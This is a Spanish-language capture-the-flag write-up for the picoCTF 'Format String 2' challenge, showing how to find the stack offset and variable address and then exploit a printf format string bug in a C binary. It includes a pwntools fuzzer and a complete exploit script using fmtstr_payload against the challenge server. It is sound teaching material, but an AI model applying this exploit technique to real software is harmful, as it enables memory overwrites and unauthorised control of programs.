# Format String 2

En este ejercicio tenemos un binario y su código en C.

```c
./vuln                    
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
hola
Here's your input: hola
sus = 0x21737573
You can do better!   
```

El programa nos devuelve lo que le pongamos y nos muestra el valor de la variable `sus`.

Si analizamos el código podemos ver cómo nuestro input se maneja de una manera insegura, sin especificar el formato, lo cual introduce una vulnerabilidad de format strings.

```c
scanf("%1024s", buf);
printf("Here's your input: ");
printf(buf); // Vulnerabilidad Format String
```

Gracias a esto podemos imprimir lo que haya en el stack.

La condición de victoria es establecer en la variable `sus` el siguiente valor:

```c
if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
}
```

Como no parece que haya ninguna otra vulnerabilidad, esto da a entender que debemos modificar el valor de `sus` utilizando la vulnerabilidad de format string. Para hacerlo necesitamos dos cosas:

1. Dirección en memoria de la variable a modificar.
2. Offset en el stack donde se encuentra nuestro input.

Para obtener la dirección de `sus`, podemos utilizar el comando `p &sus` en `dbg`:

```c
pwndbg> p &sus
$5 = (<data variable, no debug info> *) 0x404060 <sus>
```

Ahora que tenemos la dirección, solo nos falta saber la posición de nuestro input en el stack. Para esto podemos usar un fuzzer:

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)

for i in range(100):
    try:
        p = process(level='error')
        p.sendlineafter(b'?', 'ABCDEF%{}$x'.format(i).encode())
        result = p.recvuntil(b'!')
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass
```

Al revisar el resultado vemos lo siguiente:

```
13: b"\nHere's your input: ABCDEF0\nsus = 0x21737573\nYou can do better!"
14: b"\nHere's your input: ABCDEF44434241\nsus = 0x21737573\nYou can do better!" // Aquí
15: b"\nHere's your input: ABCDEF782435\nsus = 0x21737573\nYou can do better!"
```

En la posición 14 obtenemos `44434241`, que convertido a ASCII es:

```bash
pwn unhex 44434241           
DCBA
```

Y si recordamos, el fuzzer enviaba lo siguiente:

```python
p.sendlineafter(b'?', 'ABCDEF%{}$x'.format(i).encode())
```

Así que en la posición 14 del stack comienza a almacenarse nuestro input.

Con esta información, ya podemos usar la función `fmtstr_payload`, pasándole los parámetros necesarios para modificar la variable `sus` y obtener la flag:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 49373)
    return r

def main():
    r = conn()

    offset = 14  # Posición del input en el stack
    direccion_sus = exe.symbols['sus']  # Dirección de 'sus'
    valor = {direccion_sus: 0x67616c66}  # Valor objetivo para 'sus'
    
    payload = fmtstr_payload(offset, valor, write_size='byte')
    
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```
